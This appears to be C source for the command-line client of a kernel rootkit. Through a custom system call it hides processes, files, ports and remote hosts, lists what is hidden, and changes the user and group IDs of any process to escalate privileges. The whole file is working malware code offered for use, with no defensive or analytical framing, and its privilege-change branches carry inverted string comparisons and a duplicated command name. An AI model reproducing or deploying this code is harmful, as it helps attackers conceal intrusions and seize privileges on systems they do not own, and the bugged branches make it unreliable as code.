#include <stdio.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <sys/module.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>


#include "needed.h"

void print_help (char *program);
int make_syscall (int action, void *buff);

int main (int argc, char **argv)
{
	char filename[256], *buff;
	int pid;
	u_int ip;
	int len;
	u_short port;
	struct change_priv priv;

	if (argc < 2)
	{	print_help (argv[0]);
		return (0);
	}

	if (strcmp (argv[1], "printprocs") == 0)
	{	len = make_syscall (GET_PIDS, NULL);
		if (len != 0)
		{	buff = (char*)malloc(len * sizeof(int));
			make_syscall (GET_PIDS, buff);
			printf ("Hidden PIDs:\n");
			for (; len; buff += sizeof(int), len--)
				printf ("%d\n", *((int*)(buff)));
		}
		else
			printf ("Hidden PIDs not found!\n");
		return (0);
	}
	else if (strcmp (argv[1], "printfiles") == 0)
	{	len = make_syscall (GET_FILES, NULL);
		if (len != 0)
		{	buff = (char*)malloc(len * NAMELEN);
			make_syscall (GET_FILES, buff);
			printf ("Hidden files:\n");
			for (; len; buff += NAMELEN, len--)
				printf ("%s\n", buff);
		}
		else
			printf ("Hidden files not found!\n");
		return (0);
	}	

	if (argc < 3)
	{	print_help (argv[0]);
		return (0);
	}

	if (strcmp (argv[1],  "hideproc") == 0)
	{	pid = atoi(argv[2]);
		return (make_syscall (HIDE_PID, &pid));
	}
	else if (strcmp (argv[1], "unhideproc") == 0)
	{	pid = atoi (argv[2]);
		return (make_syscall (UNHIDE_PID, &pid));
	}
	else if (strcmp (argv[1], "hidefile") == 0)
	{	strcpy (filename, argv[2]);
		return (make_syscall (HIDE_FILE, filename));
	}
	else if (strcmp (argv[1], "unhidefile") == 0)
	{	strcpy (filename, argv[2]);
		return (make_syscall (UNHIDE_FILE, filename));
	}
	if (strcmp (argv[1],  "hidehost") == 0)
	{	ip = inet_addr (argv[2]);
		return (make_syscall (HIDE_IP, &ip));
	}
	else if (strcmp (argv[1], "unhidehost") == 0)
	{	ip = inet_addr (argv[2]);
		return (make_syscall (UNHIDE_IP, &ip));
	}
	if (strcmp (argv[1],  "hideport") == 0)
	{	port = htons (atoi(argv[2]));
		return (make_syscall (HIDE_PORT, &port));
	}
	else if (strcmp (argv[1], "unhideport") == 0)
	{	port = htons (atoi (argv[2]));
		return (make_syscall (UNHIDE_PORT, &port));
	}
	
	if (argc < 4)
	{	print_help (argv[0]);
		return (0);
	}
	
	if (strcmp (argv[1], "changeuid"))
	{	priv.pid = atoi (argv[2]);
		priv.owner = atoi (argv[3]);
		return (make_syscall (CHANGE_UID, &priv));
	}
	else if (strcmp (argv[1], "changeeuid"))
	{	priv.pid = atoi (argv[2]);
		priv.owner = atoi (argv[3]);
		return (make_syscall (CHANGE_EUID, &priv));
	}
	else if (strcmp (argv[1], "changegid"))
	{	priv.pid = atoi (argv[2]);
		priv.owner = atoi (argv[3]);
		return (make_syscall (CHANGE_GID, &priv));
	}
	else if (strcmp (argv[1], "changegid"))
	{	priv.pid = atoi (argv[2]);
		priv.owner = atoi (argv[3]);
		return (make_syscall (CHANGE_EGID, &priv));
	}
/*	else if (args.action == 5)
	{	struct pid_output po;

		args.buff = &po;
		for (args.len = 0; args.len > 0; args.len++)
		{	syscall (210, args);
			if (!po.found)
				break;
			printf ("pid: %d\n", po.pid);
		}
	}
	else if (args.action == 6)
	{	struct file_output fo;

		args.buff = &fo;
		for (args.len = 0; args.len > 0; args.len++)
		{	syscall (210, args);
			if (!fo.found)
				break;
			printf ("pid: %s\n", fo.filename);
		}
	} */
	print_help (argv[0]);
	return (0);
}

void print_help (char *program)
{
	printf ("Client's parameters\n");
	printf ("*===================================================*\n");
	printf ("    [PROCESS CONTROLS]\n");
	printf ("\"%s hideproc <pid>\" - hide process with <pid>\n",  program);
	printf ("\"%s unhideproc <pid>\" - unhide process with <pid>\n", program);
	printf ("\"%s printprocs\" - print hidden process\n", program);
	printf ("\"%s changeuid <pid> <uid>\" - change uid of <pid> to <uid>\n", program);
	printf ("\"%s changeeuid <pid> <euid>\" change euid of <pid> to <euid>\n", program);
	printf ("\"%s changegid <pid> <gid>\" - change gid of <pid> to <gid>\n", program);
	printf ("\"%s changeegid <pid> <egid>\" - change egid of <pid> to <egid>\n", program);
	printf ("    [FILE CONTROLS]\n");
	printf ("\"%s hidefile <name>\" - hide all files with <name>\n", program);
	printf ("\"%s unhidefile <name>\" - unhide all files with <name>\n", program);
	printf ("\"%s printfiles\" - print hidden files\n", program);
	printf ("    [PCB CONTROLS]\n");
	printf ("\"%s hideport <num>\" - hide all things connected with port <num>\n", program); 
	printf ("\"%s unhideport <num>\" - unhide all things connected with port <num>\n", program); 
	printf ("\"%s hidehost <ip>\" - hide all connections with <ip>\n", program);
	printf ("\"%s unhidehost <ip>\" - unhide all connections with <ip>\n", program);
	printf ("*===================================================*\n");
}

int make_syscall (int action, void *buff)
{
		struct u2k_args args;
			
		args.action = action;
		args.buff = buff;
		return (syscall (210, args));
}
